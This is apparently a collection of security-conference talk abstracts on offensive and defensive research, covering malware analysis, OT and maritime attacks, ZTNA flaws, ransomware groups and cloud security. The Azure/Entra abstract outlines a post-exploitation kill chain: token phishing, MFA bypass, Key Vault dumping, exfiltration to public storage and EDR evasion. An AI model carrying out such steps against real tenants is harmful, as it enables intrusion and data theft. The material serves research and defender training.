<p>This Workshop delves deep into the intricate structures of PDF files, offering a meticulous analysis of each segment. Unveiling the covert strategies of threat actors, we explore how they ingeniously incorporate malicious components into file structures. The session elucidates the meticulous collection of IOCs (Indicators of Compromise) and the construction of IOAs (Indicators of Attack) for behavioral analysis, empowering defenders to anticipate and thwart novel attack vectors.
Our technical journey navigates through the PDF file's anatomy, encompassing headers, bodies, cross-reference tables, and trailers. Live demonstrations dissect malicious PDFs using tools like pdfid, pdf-parser, and pdftk, providing hands-on insights into the analysis process. The presentation unravels encoding techniques and exposes threat actors' methodologies in establishing Command and Control (C&amp;C) channels within PDF files. The session concludes with an opportunity for questions, equipping participants with advanced knowledge for robust malware analysis and proactive defense strategies.</p>

<p>Weâre trying to debug the end of the world through trial and error â mostly error. In the middle of a worsening climate crisis, outdated OT protocols like Modbus are being exploited by state-sponsored actors in ways that turn environmental infrastructure into geopolitical weapons. From hijacked dams running Windows 95-era code to smart thermostats recruited into botnets fighting over Arctic oil, the climate-tech battlefield is already here.</p>

<p>This session dives into how APTs are quietly compromising the systems designed to save the planet. Weâll examine real-world campaigns where threat actors have targeted energy grids, carbon capture labs, and EV infrastructure â and how climate action is being derailed by 1970s-era code and modern apathy.</p>

<p>This is Cyber Threat Intelligence meets Climate Fiction (Cli-Fi). Itâs weird, terrifying, and very real.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>There's been remarkably little discussion about how mobile forensic tools fare against adversarially modified environments, particularly in terms of forensic reliability. Tools (and investigators) often assume that target devices function as expected, with minimal scrutiny of whether that assumption holds. Our research demonstrates otherwise - sophisticated anti-forensic techniques placed within Android devices can silently compromise evidence, placing longstanding investigative and extraction methodologies at risk.</p>

<p>Our research addresses a blind spot in Android logical extraction workflows - namely, an assumption that once mobile forensic software overcome the hurdle of device access, the extraction is assumed to follow correctly. While forensics software excel at getting a foot in the door, from our actual tests they offer little against stealthy, second-layer countermeasures that can silently manipulate or destroy data post-access.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Sector Down is a high-stakes, immersive multiplayer card game where critical infrastructure and cybersecurity collide. Designed for teams of 5, 10, 15, or 20 players, this simulation pits defenders and attackers against each other in a race against the inevitable: The Doom Clock.</p>

<p>ð¡ï¸Defend or Disrupt</p>

<p>Players are divided into two sides:
- Blue Team â Critical infrastructure defenders. Each Blue player manages a sector with three vital facilities: Physical, Network, and Financial. Their mission? Keep the systems alive and online while working together to run out the clock.
- Red Team â Offensive disruptors. Red players attempt to take down facilities using calculated cyberattacks and chaos tactics. Their goal: force sector collapses and trigger the Doom Clock.</p>

<p>â±ï¸ Time-Based Tactics</p>

<p>The game progresses in strategic phases where players draw cards, take action using worker tokens, and discard based on hand limits. Watch out for unpredictable âWhite Playsâârandom game events that add surprise twists every few rounds.</p>

<p>ð¥ The Doom Clock</p>

<p>When half of all sectors or any core sectors go down, the Doom Clock starts ticking. Teams must respond fast: Blue must recover systems before the countdown hits zero, or Red claims victory.</p>

<p>ð¤ Team Dynamics</p>

<ul>
<li>Worker Sharing: Blue teammates can lend each other resources in bonus phases.</li>
<li>Overtime Mechanics: When the pressureâs on, Blue players can double down on effortâwith the tradeoff of worker exhaustion in future turns.</li>
</ul>

<p>Referral Rewards Programs. Functionality that most probably view as boring and not worth the time looking at while hunting for bugs on a program. After a deep dive into the implementation of this functionality across dozens of programs, I found them to be hiding some very interesting bugs. My research uncovered various types of business logic flaws, race conditions, and even how the implementations created various client-side gadgets such as cookie-injection and client-side path traversal which could then be used as a part of a client-side chain. This research uncovered vulnerabilities in multiple large bug bounty programs.</p>

<p>Triage sits at the heart of every successful bug bounty and vulnerability disclosure program, yet it remains one of the most misunderstood and friction-heavy processes in our industry. As platforms scale to handle thousands of reports while maintaining quality and researcher satisfaction, the challenge isn't just operationalâit's fundamentally human.</p>

<p>This talk pulls back the curtain on modern triage operations, exploring how leading platforms structure their workflows, train their teams, and balance the competing demands of speed, accuracy, and community trust. We'll dive into the operational realities of scaling triage across diverse programs, the tools and processes that enable consistency, and the communication strategies that turn potential conflicts into collaborative dialogues.</p>

<p>Drawing from real-world experiences, we'll examine how platforms are evolving their approach to handle disagreements constructively, implement fair appeals processes, and gather meaningful feedback from researcher communities. We'll also look ahead to emerging technologies and cultural shifts that promise to reshape how triage operates.</p>

<p>Whether you're building a triage team, managing researcher relationships, or simply trying to understand why that report was closed, this session offers practical insights into creating triage processes that serve both security outcomes and human needs. Because great triage isn't just about finding the right answerâit's about building the trust and transparency that makes our entire ecosystem stronger.</p>

<p>This presentation aims to provide an actionable strategy to connect theoretical threat modelling frameworks and practical cloud implementations. We analyze why legacy approaches do not work for cloud-native applications, particularly microservices and serverless architectures. </p>

<p>We will explore how to:
â¢ establish a realistic threat modelling schedule which provides real value lowering the risk of handling threat modelling as just a ""tick-the-box"" activity;
â¢        create effective cloud architecture diagrams to make it understandable and handy for developers to brainstorm possible threats;
â¢        implement effective system decomposition strategy to get rid of the monolithic threat modelling which fails for distributed cloud systems. We will demonstrate how this decomposition enables a targeted application of the STRIDE model, highlighting cloud-specific threat vectors and nuances, such as those arising in cross-tenant scenarios;
â¢        adapt DREAD risk evaluation framework for the cloud;
â¢        effectively engage stakeholders across development, security, and operations;
â¢      use AI as a starting point in threat modelling (demo included) and understand where human expertise remains critical.
We will make sure attendees gain a clear understanding of why traditional threat modelling is insufficient for modern cloud environments and will leave with a practical framework and techniques they can immediately apply to their own cloud deployments, improving their organization's security posture and reducing cloud-related risks.</p>

<p>Browser extensions have become increasingly popular for enhancing the web browsing experience. Common examples are ad blockers, cryptocurrency wallets, and password managers. At the same time, modern websites frequently display intrusive elements, such as cookie consent banners, newsletter subscription modals, login forms, and other elements that require user interaction before the desired content can be displayed.</p>

<p>In this talk, I will present a new technique based on clickjacking principles that targets browser extensions, where I used fake intrusive elements to enforce user interaction. In my research, I tested this technique on the 11 most widely used password managers, which resulted in discovering multiple 0-day vulnerabilities that could affect tens of millions of users. Typically, just one click was required from a user to leak their stored private information, such as credit card details, personal data or login credentials (including TOTP). In some cases, it could lead to the exploitation of passkey authentication.</p>

<p>The described technique is general and can be applied to browser extensions beyond password managers, meaning other extensions may also be vulnerable to this type of attack. In addition to describing several methods of this technique, I will also recommend mitigations for developers to protect their extensions against this vulnerability.</p>

<p>Bare metal cloud providers are rapidly gaining popularity among organizations deploying high-performance machine learning workloads. While the promise of dedicated hardware and enhanced security may appear attractive, a closer look revealed that these environments are vulnerable to decades-old attacks that are sure to trigger nostalgia.</p>

<p>This talk investigates the hidden risks posed by the ""bare metal"" trend, illustrating how weaknesses in firmware, hardware, and the network can lead to catastrophic multi-tenant compromise. We'll walk through real-world case examples demonstrating how attackers can leverage these vulnerabilities including hijacking provisioning processes, installing persistent firmware implants, intercepting sensitive network data, and compromising secure machine learning workflows.</p>

<p>Attendees will gain insight into the unique attack surfaces of bare metal environments, understand why seemingly outdated techniques remain highly effective, and learn how major cloud providers mitigate these threats. Expect technical demonstrations, practical advice on evaluating providers, and recommendations for protecting your organization's critical infrastructure.</p>

<p>Many organisations are moving to Zero Trust Network Access (ZTNA) and Secure Access Service Edge (SASE) solutions in response to the real and well-documented risks associated with traditional VPNs. These cloud-era alternatives promise improved security through finer-grained access controls and better posture enforcement. But are these 'next-gen' cloud VPNs truly secure? In this 45-minute session, we present new research revealing that many leading ZTNA platforms - including offerings from ZScaler, Netskope and Check Point - inherit legacy VPN weaknesses while introducing fresh cloud-based attack surfaces.</p>

<p>We demonstrate the process of external recon, bypassing authentication and device posture checks (including hardware ID spoofing) and abuse insecure inter-process communication (IPC) between ZTNA client components to achieve local privilege escalation. We show it is possible to circumvent traffic steering to reach blocked content, exploit flaws in authentication flows to undermine device trust, and even run malicious ZTNA servers that execute code on connecting clients. Throughout the presentation, we highlight previously undisclosed vulnerabilities identified during our research. Zero trust does not mean zero risk.</p>

<p>Yaroslav Vasinskyi was sentenced in 2024 to 13 years in U.S. federal prison for his role in the $700M Kaseya ransomware attack. But behind the headlines lies a more human and complex story. Over the past year, threat researcher Jon DiMaggio built a relationship with Vasinskyi, speaking with him regularly by phone and email. Joining him is John Fokker, Head of Threat Intelligence at Trellix and former Dutch cybercrime investigator involved in operations targeting the REvil gang with global law enforcement.</p>

<p>This talk reveals how REvil operated from the inside, what really happened behind the Kaseya attack, and how ego, greed, and betrayal tore the crew apart. The session also provides new information on the groupâs leadership, who vanished and remain at large.</p>

<p>This isnât theory or speculation. It is raw human intelligence, operational insight, and criminal context behind one of the most devastating ransomware attacks in history. It also tells Vasinskyiâs personal journey, revealing the often overlooked human side of ransomware crime.</p>

<p>Coinciding with the next Ransomware Diaries release, this talk exposes the inner workings and unraveling of one of the most infamous ransomware groups of all time. This is not a glorification, it is a reckoning.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The rapid growth of cyber threats has made endpoint logging a critical component of modern security operations. Defenders increasingly rely on endpoint telemetry like Sysmon logs to detect and investigate breaches. These logs capture crucial forensic evidence, but the sheer volume and complexity of Sysmon logs often overwhelm analysts and hinder timely and effective analysis. Garuda is an open-source PowerShell framework designed to address this challenge by providing a unified, flexible, and efficient approach to endpoint detection and response using Sysmon events. With advanced filtering capabilities, cross-event correlation, multiple contextual views, precise time-based noise reduction, and support for both remote and offline (EVTX) analysis, Garuda enables security teams to quickly uncover attack chains, investigate incidents, develop detection logic, and perform in-depth malware analysis all within a single, scriptable environment. Its extensible nature allows one to use it for various scenarios, including threat hunting, investigation, anomaly detection, detection engineering, and malware analysis. Garuda can accelerate investigations, improve detection, and provide deep visibility into endpoint activity.</p>

<p>For those ambitious threat actors targeting on OT/ICS field, their actions invariably are highly intensity planed to produce successful hacking. By abusing multiple misconfigurations and benign OT-specific nature infrastructure to evade multiple layers of protection, they can stealthily control the factoryâs essential assets from IT to OT fields. For example, according to Mandiantâs report, the Russian hacker group, Sandworm, abused OT-level LoTL (Living Off the Land) to disrupt power in Ukraine. The key to success is abusing those OT-specific protocols, techniques, and LOLBins which are difficult to detect as malicious by modern AV/EDR.</p>

<p>In this research, instead of detecting MALICIOUS, we propose a novel multimodal AI detection, Suspicious2Vec, which archives contextual comprehension on process integrity and suspicious behaviors of OT/ICS benign operation. We use the AI model on large-scale real-world factories, to create a baseline of universal nature OT-specific operating into numerical vectors and success filter in-the-wild anonymous abuse for attacks into malicious.</p>

<p>From July 2023 to July 2024, our experiment whole year to received 2,000,000 data which were detected as unique suspicious techniques by 562+ human-written expert rules. We use the AI model to project those suspicious actions into numerical vectors by well-known word embedding methods, and also model all the suspicious behaviors from the OT + IT malware family from VirusTotal to generate a set of malware templates as neural ASR (Attack Surface Reduction) rules for detection, and success capture 12+ variant OT malware from 52,438 factory program files.</p>

<p>IoT environments generate massive, noisy streams of logs and alertsâmost of which lack the context needed for meaningful detection or response. This talk introduces a novel, LLM-free approach to large-scale alert contextualization that doesn't rely on writing complex queries or integrating heavy ML models. Weâll demonstrate how lightweight, modular correlation logic can automatically enrich logs, infer context, and group related events across sensors, devices, and cloud services. By leveraging time, topology, and behavioral attributes, this method builds causality sequences that explain what happened, where, and whyâwithout human-crafted rules or expensive AI inference. Attendees will walk away with practical techniques and open-source tools for deploying contextualization pipelines in resource-constrained IoT environments. Whether you're defending smart homes, industrial OT networks, or edge devices, you'll learn how to extract insight from noiseâfast.</p>

<p>Role-Based Access Control (RBAC) is the final layer of defense between a compromised Kubernetes workload and a full-scale cluster breach. Yet real-world RBAC configurations, especially those shipped by popular open-source operators and Helm charts, are rarely reviewed with an adversarial mindset.<em>x000D</em>
<em>x000D</em>
In this talk I introduce RBAC ATLAS, a curated index of identities and RBAC policies found in popular Kubernetes projects. Powered by rbac-scope, a purpose-built static analyzer I created, RBAC ATLAS enriches each policy with security annotations highlighting granted permissions, over-privileged resources, lateral-movement pivots and abuse primitives.<em>x000D</em>
<em>x000D</em>
The talk begins with a concise RBAC 101, explaining the common misconfigurations that transform a supposedly âleast-privilegeâ setup into de facto cluster-wide root. We will then pivot to thinking like the adversary, demonstrating how attackers chain cluster-role impersonation, secret exfiltration, and CRD-based privilege-escalation techniques to gain lateral movement. Next, we will open the hood on rbac-scope, showing how its analysis pipeline and scraping workflows automatically surface risky policies. Finally, We will discuss key findingsâcalling out the riskiest projects I analyzed, the permission patterns distilled from analyzing over 100 policy objects, and concrete ways attackers and defenders can feed these insights into their daily security operations.</p>

<p>Apple Intelligence, Apple's latest AI-powered tools is integrated across its devices, is designed to enhance user productivity, privacy, and convenience. However, like any advanced technology, it carries the potential for misuse in the realm of cybercrime. Malicious actors could exploit features such as AI-generated content, personal data summarization, or automated decision-making to craft more convincing phishing attacks, create deepfake audio or messages mimicking trusted contacts, or extract sensitive information from stolen devices more efficiently. Additionally, if vulnerabilities in Apple Intelligence are discovered, attackers could potentially hijack its functionalities for surveillance, data theft, or unauthorized access. This talk covers the digital evidence available to investigators to uncover the malicious use of Apple Intelligence.</p>

<p>Maritime vessel controls and operational technology (OT) systems are getting more complex and interconnected. With industry trends aiming to reduce crew, automate tasks, and improve efficiency, these networks are expanding in scale, intricacy, and criticality for vessel operation and maintenance. The standard controller area network (CAN) bus for maritime vessel networks, developed by the National Marine Electronics Association (NMEA), known as NMEA2000. NMEA2000 is an application layer network protocol built on the ISO11783 standard and compatible with automotive SAEJ1939, it uses unique message identifiers known as Parameter Group Number, to define the data within each communication frame. Despite its widespread use, NMEA2000 remains a relatively unexplored domain, particularly in understanding normal versus abnormal network behavior, due to the unavailability of open-source datasets. To address this gap, we constructed a NMEA2000 system consisting of five nodes: GPS/Radar, Wind Speed/Direction sensor, and Multifunction Display. Using this setup, we collected datasets to analyze system behavior and developed deterministic fingerprints for each sensor, establishing a baseline of the normal operating system. We subject the system to controlled attacks to evaluate the accuracy and effectiveness of the fingerprints. This work represents a foundational step towards enhancing security and reliability in maritime OT systems.</p>

<p>Current ship simulators are designed to help masters and mates pass their STCW exams. They were never designed for cybersecurity use. So, here is the interesting question that will be considered during the presentation. What is the ideal architecture of a virtual ship environment for cybersecurity education, assessment, and research use? Recent work at UNCW suggests there is a need for a hybrid virtual environment comprised of a full mission (above and below the waterline) ship simulator coupled with sub-system device emulators and specialized software applications. Examples of required device emulators include communication devices, bridge instruments, and industrial controllers. Coupling can be accomplished through logical or physical means. Examples of specialized software applications include network traffic generation, strategically located test access points for staging exploits, cyber data analytics, and trainer control over directed simulations. Cybersecurity use cases are being used to help shape derivative functional requirements. Rather than develop a novel virtual environment from scratch, UNCW has been looking into the feasibility of augmenting an existing, commercially available ship simulator with new functionality such that it is fit for cybersecurity use. Unitestâs, Winterthur X92 marine engine simulator is an ideal candidate that will be briefly demonstrated during the presentation.</p>

<p>In this talk you get an insight into real-world Red Team operations conducted onboard ships and against maritime companies. Drawing from first-hand experience, the presentation walks through how Red Teamers boarded cruise ships undercover as regular passengers and proceeded to gain deep access to both IT systems and critical operational areas. The talk reveals how testers were able to physically enter restricted zones such as communication rooms and engine control rooms, all while blending in with guests and crew. It will also showcase how vulnerabilities in shipboard infrastructure allowed the team to manipulate or disable key systems, including navigation and onboard communications, on both passenger and cargo vessels. Whether youâre in cybersecurity, maritime operations, or just curious about how to hack a ship, this is a talk you donât want to miss.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>This talk aims to educate the participants about security of quantum computing systems.</p>

<p>Why?</p>

<p>Today, quantum computers are deployed online without any security mechanisms. Researchers have been able to present crosstalk and other attacks without really violating any protection mechanisms, because there are none. Having learned from classical security that it takes many years to find and patch hardware-related problems, think Spectre or Rowhammer attacks that are actually still not patched, we need to study and educate people about quantum computer security now, so security mechanisms can be designed and deployed before quantum computers are widely spread.</p>

<p>What?</p>

<p>The talk will focus on crosstalk attacks, which have many similarities to Rowhammer in classical computers, at least in the way they behave conceptually. The talk, and brief demonstration, will be focusing on cloud-based quantum computers to show effects of crosstalk. This will make the audience consider implications of shared quantum computers, how and if multi-tenant computers should be deployed, and in general understand that the noisy and fundamentally analog nature of the machines opens them up to various security threats.</p>

<p>Whom?</p>

<p>The talk will be aimed at anyone interested in security. By focusing on code examples and brief demonstration, the talk will be sort of demonstration based, rather than physics or math based. Fundamentally, quantum computer is just a computer, and hackers and others interested in security should not need to worry about the physics before jumping into evaluating, testing, and eventually helping to secure these systems by understanding how they can break or be attack.</p>

<p>How you're going to give the talk?</p>

<p>The talk will be an interactive presentation. It will be based on slides, but audience can ask questions, etc., there will be small demo during the talk. Quantum computer experiments will be run live, but due to long queues, pre-recorded data will be used to analyze the results if the online demo does not finish in time. Code will be posted online for others to try at home. While I cannot guarantee it, I will work with qBraid to provide some quantum credits and perhaps participants can run the code in parallel to the demo. I hope this is an educational, interactive, mini-lecture on crosstalk attacks.</p>

<p>This comprehensive talk will provide an in-depth exploration of advanced threat hunting strategies, showcasing the methodologies employed in our recent reporting on the Decline of Black Basta. Attendees will learn how we tracked threat actor activity on the dark web, specifically focusing on Black Basta, to uncover emerging tactics, affiliations, and operational insights through analysis of illicit forums and marketplaces.<em>x000D</em>
 <em>x000D</em>
The presentation will delve into techniques for monitoring the activities of ransomware-as-a-service (RaaS) groups, including how shifts in membership and operational practices occur after disbandment. Further, we will discuss how to harness investigation telemetry to detect and analyze evolving tactics, techniques, and procedures (TTPs). These approaches enable organizations to anticipate sophisticated cyber campaigns and proactively bolster their defensive strategies.<em>x000D</em>

<font size=""+1""><strong>Description:</strong></font><br>
Traditional OSINT collection faces two critical challenges: public APIs throttle queries to prevent abuse, and each query potentially reveals investigative interests to service providers. This talk presents a practical solution using Knowledge Graph technology combined with RDF (Resource Description Framework) to build queryable, offline OSINT repositories._x000D_<br />
We demonstrate how to scrape multi-source OSINT data, transform it into RDF format, align it with common ontologies, and store it in local data packages. Once built, analysts can run complex SPARQL queries against their local triplestore without external dependencies or operational security concerns.<br />

<font size=""+1""><strong>Description:</strong></font><br>
<p>Operating with modern red team tools has a lot of ins, a lotta outs, a lotta what-have-yous. If you were like me before operating with tools like Mythic, managing your projects with Ghostwriter, and analyzing your data automatically with Nemesis, you were probably living in the past and piecing things together manually, writing things down in a tedious, un-zen lack-of-system that would leave you scrambling at the end of testing, when your report should be about to go to a peer review or QA. </p>

<p>You might be saying, ""But Michael, I like doing things manually and wasting mine and my client's time."" Yeah, well, you know, that's just, like, your opinion, man. </p>

<p>That is entering a world of pain. I don't know about you, but when that's happening, I feel really out of my element. </p>

<p>Luckily, Mythic, Ghostwriter, and Nemesis really tie the room together and are a huge quality-of-life boost. No more will you say to yourself, ""This aggressor script will not stand, man!"" Sometimes the bear eats you, but it's high time you eat the bear. </p>

<p>Get ready to be bowled away by a modern approach to managing your red team operations with tools like Mythic, Ghostwriter, and Nemesis (or whatever else you can think of to plug into these tools' APIs if you're note into the whole brevity thing) to streamline your workflow. </p>

<p>You might get so excited that you'll flail your arms around in joy - but be careful man, there's a beverage here! </p>

<p>Over the past few years, we've really seen API hacking take off as a field of its own, diverging from typical web app security, but yet parallel to it. Often we point to the amorphous blob that is web security and go: ""here you go, now you can be a hacker too"", with top 10 lists, write-ups, conference talks and whitepapers smiling as we do. This creates a major challenge for developers who want to test their APIs for security or just people who want to get into API hacking, how on earth do you wade through all the general web security to get to the meat of API hacking, what do you even need to know? This talk is going to break down API hacking from a developer point of view, teaching you everything you need to know about API hacking, from the bugs you can find and to the impact you can cause, to how you can easily test your own work or review your peers. So what are you waiting for join me and go hack yourself!</p>

<p>uncovered a mis-routed SIP policy on O2âs IMS core that let any device on the data network bypass the P-CSCF firewall and inject raw SIP traffic directly into the S-CSCF. A proof-of-concept âsilent dialerâ malware exploited the gap to auto-REGISTER rogue identities, issue INVITEs that redirected live VoLTE calls, and siphon RTP audioâwhile every packet looked like normal internal signaling. No internet, VPN or root exploits were needed; the flaw lived entirely in the operatorâs own trust model, proving how a single IMS rule slip can open the door to full-scale voice and data surveillance.</p>

<p>While cloud-native AI dominates security discussions, desktop appsâstill vital in engineering, design, and financeâare quietly evolving. No longer just âlegacy,â they now embed local LLMs, predictive UIs, automation, and offline inference.</p>

<p>This talk reframes AI security for desktop environments. Weâll explore new risks: prompt injection in on-device models, adversarial inputs, inference abuse, and insecure plugins. These threats donât replace traditional flaws like memory corruption or unsafe parsingâthey amplify them.</p>

<p>Weâll demo prompt injection on a local LLM and file-format fuzzing causing legacy crashes. Then weâll cover AI-aware threat modeling, including tampered models and insecure automation. If you think desktop app security is solved, this talk will challenge thatâand offer tools to secure hybrid software at the AI + legacy intersection.</p>

<p>In todayâs bug bounty landscape, advantage goes to those who can see what others miss. The OWASP Amass Project has long equipped researchers with powerful tools for internet asset discovery, but its newest additionâassocâtakes things to the next level. This talk introduces assoc, a tool that allows hunters to explore the Open Asset Model through custom association triples, a concept inspired by RDF triples used in knowledge graphs. These user-defined relationships enable highly targeted queries across a rich graph of internet data, revealing non-obvious associations between domains, IP addresses, certificates, and legal entities. </p>

<p>Attendees will learn how assoc empowers them to define their own asset discovery logic, conduct complex association walks through the graph, and surface infrastructure that traditional scanners and passive methods overlook. Whether you're pivoting off a supplierâs ASN, correlating certificate reuse across sub-brands, or mapping out a shadow IT network tied to a legal entity, assoc offers an unmatched level of flexibility and precision. Live demos will show how to craft custom triples, execute walks, and extract actionable intelligenceâall with an eye toward real-world bug bounty impact. If you're ready to out-hack the competition, this is a talk you wonât want to miss.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>As orgs lean harder on Entra and Azure for critical IdP and infra, attackers are shifting too. This talk introduces a PowerShell-based post-exploitation toolkit that uses only native Windows features and the Microsoft Graph API â no external modules, agents, or DLLs required. Designed to âlive off the Graph,â it enables stealthy recon, escalation, persistence, and exfil using just REST calls and default PowerShell, evading top EDRs with ease (as of April 2025, at least).</p>

<p>Weâll walk through real-world kill chains using Microsoftâs own APIs, abusing OAuth flows, consent, and service principal escalation to move laterally, assign roles, drop loot, and stay hidden. Attendees will learn how attackers can inject secrets into app registrations, enumerate high-privilege service principals, assign Entra + Azure roles via Graph/ARM, and exfiltrate via tenant-native blob storage - all without touching the Azure portal or importing a single module.</p>

<p>No implants. No imports. No sketchy domains. Just whatâs already there.</p>

<p>To ground the talk, Iâll give a short crash course on Azure OAuth, app types, API endpoints, and how attackers bypass common controls like MFA, CAP, and Token Policies.</p>

<p>A full lab demo will show how access is gained via spear-phishing, followed by escalation and persistence using only built-in PowerShell. Blue teamers will walk away with concrete detection ideas. Red teamers will leave with a frameworkâor inspiration to build their own.</p>

<p>Toolkit Breakdown</p>

<p>Requirements:
- PowerShell execution
- Internet access to Azure APIs
- A juicy Azure target</p>

<p>Auth:
- Spear-phish via Microsoftâs Device Code Auth (popularized by Russian APTs this year)
- Store tokens in a native JSON-based keyring
- Tag tokens by role for scope tracking</p>

<p>Recon:
- Enumerate Service Principals + Graph scopes (regex filtering)
- Enumerate ARM role assignments (regex filtering)
- Enumerate Key Vaults
- Identify attack paths from collected data</p>

<p>Persistence:
- Create malicious apps
- Inject secrets into any apps
- Add remediation tasks
- Spawn containers/functions</p>

<p>Escalation:
- Use keyring + recon to select injection targets
- Pivot via apps to bypass CAP/MFA/token policies
- Dump Key Vaults
- Rotate identities mid-chain
- Assign permissions to any app</p>

<p>Exfil:
- Recon modules write loot as .csv
- Create public Azure blob storage
- Upload loot directly</p>

<p>Stealth:
- No compiled codeâjust .ps1, .json, .csv
- Built-in PowerShell + REST only
- Avoids PowerShell and module-based detections
- No alerts from CrowdStrike, Defender, or SEP in testing</p>

<p>Automation:
- Spear-phish module auto-generates lures and captures tokens
- One-shot persistence module sets up a cron-style enumerate+dump pipeline in cloud containers
- One-shot exfil module creates resources, publishes open loot container
- Operator just selects targets/IDs</p>

<p>This tool is actively developed by me. Nobodyâs seen it in action yetâexcept my girlfriend and my cats. Been saving it for DEFCON :)</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Trevor<br>
<p>I'm a lifelong hacker and technology enjoyer, with a passion for automation and expanding my knowledge of new systems. I got started with ""security"" as a preteen, hacking with BackTrack and taking advantage of the relatively insecure implementations that were pervasive in the early 2000s. After finishing school, I started working in IT and eventually moved into cybersecurity professionally.</p>

<p>Fast forward to 2025: I'm currently a Lead Security Engineer at Wells Fargo, focusing on adversary emulation and offensive security research. In this role, I create PoCs and tools to exploit the latest vulns and bypass EDR, and I train junior engineers and analysts on complex techniques and topics. The tooling and training I provide typically illustrate full kill chains, empowering them to hunt and respond with speed and precision.</p>

<p>Prior to my current role, I worked as a Senior Cloud Security Engineer at Wells Fargo, focusing heavily on blue teamâoriented Azure operations. Much of the inspiration for this tool and demo comes from the experience I gained working in the Bank's highly restricted, federally regulated environment. Before Wells Fargo, I was at Sony (PlayStationâthe cool one :P) as an L3 Sysadmin, and at Kudelski Security (an MSSP) as a Security Engineer supporting dozens of massive clients around the globe. Thanks to that prior experience, Iâve had the privilege of being exposed to a wide variety of environments and tooling, which I'm grateful for.</p>

<p>Outside of work, I'm either studying (GXPN currently) or in the lab developing my own projects, researching, building, breaking, etc.</p>

<p>Unrelated, but Iâve also been DJing at DEFCON for the last few years, so Iâm especially hyped to level up my participation and submit a talk/demo for my favorite village. DEFCON pushed me further down this path early on, and Iâm ready to give back. Besides computers, Iâm also very into fast cars and massive sound systems. </p>

<p>When it comes to offensive ops: living off the land is the motto, exploitation is the mission, automation is the lifestyle.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>What does the ""perfect"" CI/CD pipeline look like, especially one built with security at its core? This hands-on workshop explores that ideal using readily available open-source tools. We'll dissect the essential stages of a modern pipeline, demonstrating how to integrate security seamlessly throughout the development lifecycle (DevSecOps).</p>

<p>Through practical, step-by-step guidance, we'll implement key security checks like iinfrastructure vulnerability scanning, secrets detection and code analysis using popular OSS tools within a functional pipeline. We wonât forget about the pipeline security itself, we will review best practices to secure our CI/CD process. While we'll showcase specific tools and configurations, the goal is not just replication, but understanding how and why these security controls work.</p>

<p>Discover the underlying principles of secure pipeline design and leave with actionable techniques to start building your own hardened, practical CI/CD pipeline.</p>

<p>Outline:</p>

<ol>
<li><p>Introduction</p>

<ul>
<li><p>Brief presenter introduction.</p></li>
<li><p>Setting the stage: The need for secure CI/CD pipelines.</p></li>
<li><p>Fundamentals Recap:</p></li>
<li><p>Quick overview: What is Continuous Integration, Continuous Deployment and Continuous Security?</p></li>
</ul></li>
<li><p>Scope &amp; Learning Objectives</p>

<ul>
<li><p>Workshop Focus: Demonstrate building a ""perfect"" (secure and practical) CI/CD pipeline using open-source tools.</p></li>
<li><p>Key Goal: Inspirational, not prescriptive. Attendees should understand the <em>principles</em> and identify <em>modular components</em> they can adapt to their own environments. The aim is to grasp the <em>idea</em> of a secure pipeline, not to replicate this specific example verbatim.</p></li>
<li><p>Learning Outcomes: Attendees will understand the key stages of a secure pipeline, know relevant OSS tools for each stage, and grasp the principles needed to start building or improving their own secure CI/CD process.</p></li>
<li><p>Out of Scope (What this workshop is NOT):</p></li>
<li><p>Deep dives into specific development workflows (e.g. Gitflow, Trunk-based).</p></li>
<li><p>Focus on a specific application technology stack (language/framework agnostic where possible).</p></li>
<li><p>A definitive statement on the ""best"" tools (alternatives will be mentioned for key steps).</p></li>
<li><p>Assumption: We will work from a simplified ""greenfield"" perspective for clarity.</p></li>
</ul></li>
<li><p>""Perfect Secure Pipeline"" Overview</p>

<ul>
<li>Visual explanation of the ""perfect"" pipeline stages.</li>
</ul></li>
<li><p>Secure Pipeline Step-by-Step Breakdown (Hands-On)</p>

<ul>
<li><p>For <em>each</em> key stage (e.g., Pipeline Scan, IaC Scan, Container Scanning, Secrets Detection, SAST/SCA):</p></li>
<li><p>Goal: What security risk are we trying to mitigate with this step?</p></li>
<li><p>OSS Tool Demo of the chosen open-source tool (e.g., Chekov for IaC, Trivy for container scanning, Gitleaks for secrets). Briefly mention 1-2 alternatives.</p></li>
<li><p>Live Demo - Break &amp; Fix:</p></li>
<li><p>Pipeline <em>without</em> the check -> potential security failure.</p></li>
<li><p>Integrate OSS security tool into the pipeline.</p></li>
<li><p>Trigger pipeline again -> security issue found.</p></li>
<li><p>Fix the issue.</p></li>
<li><p>Re-run pipeline -> successful pass.</p></li>
</ul>

<p>For time reasons, we will focus specially in Pipeline Security, Infra as Code scan, Container Scan and Secrets Detection steps.</p></li>
<li><p>Conclusion &amp; Q&amp;A</p></li>

<p>AWS Security MCP(Model Context Protocol) Server - is a tool I've built that fundamentally changes how security teams interact with their AWS environments. Instead of wrestling with the AWS CLI or sifting through thousands of findings from traditional scanners, you can simply talk to your AWS infrastructure using natural language.</p>

<p>This project connects AI assistants like Claude directly to your AWS account, enabling you to:</p>

<p>github link - https://github.com/groovyBugify/aws-security-mcp</p>

<ol>
<li><p>Instantly locate resources by IP, tag, name or any attribute across your entire infrastructure</p></li>
<li><p>Generate threat models on-demand for specific services or team resources</p></li>
<li><p>Visualize attack paths and potential privilege escalation routes</p></li>
<li><p>Perform blast radius analysis to understand the impact of potential compromises</p></li>
<li><p>Seamlessly search across GuardDuty, SecurityHub, and IAM Access Analyzer findings</p></li>
<li><p>Ask natural questions like ""Which EC2 instances have public IPs and excessive IAM permissions?""</p></li>
</ol>

<p>We will also be covering how we designed the tool to maintain context and token size limits for any MCP Clients. </p>

<p>During my years leading cloud security and bug bounty hunting, I've repeatedly faced the frustration of piecing together information scattered across multiple AWS services. This tool solves that problem by providing a conversation layer that maintains context across your entire infrastructure.</p>

<p>In this talk, I'll demonstrate real-world scenarios where AWS Security MCP helped identify complex security issues that traditional tools missed. For instance, discovering a privilege escalation path that crossed boundaries between EC2, IAM, and S3 which appeared as low-severity individual findings but created a critical attack path when combined.</p>

<p>I'll show how you can:</p>

<ol>
<li><p>Instantly identify which team owns a mysterious IP address appearing in your logs</p></li>
<li><p>Visualize the network connectivity between your microservices</p></li>
